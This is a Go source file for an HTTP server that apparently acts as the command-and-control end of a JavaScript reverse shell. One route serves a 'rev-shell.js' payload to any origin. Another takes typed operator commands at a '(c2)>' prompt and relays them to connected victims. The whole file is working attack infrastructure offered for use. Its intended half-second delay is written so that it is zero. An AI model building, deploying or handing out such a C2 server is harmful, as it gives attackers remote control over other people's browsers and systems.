package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func cmdHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("recieved req")
	time.Sleep(1 / 2 * time.Second)

	fmt.Print("(c2)>")
	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		log.Fatal("could not read from stdin", err)
	}

	enableCors(&w)
	fmt.Fprint(w, input)
}

func enableCors(w *http.ResponseWriter) {
	(*w).Header().Set("Access-Control-Allow-Origin", "*")
}

func getHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("initialization of reverse shell")

	file, err := os.ReadFile("../js/rev-shell.js")

	if err != nil {
		log.Fatal("could not open file", err)
	}
	script := string(file)

	enableCors(&w)
	fmt.Fprint(w, script)
}

func main() {
	http.HandleFunc("/get", getHandler)
	http.HandleFunc("/", cmdHandler)

	port := ":8080"

	fmt.Println("listening on port", port)
	http.ListenAndServe(port, nil)
}
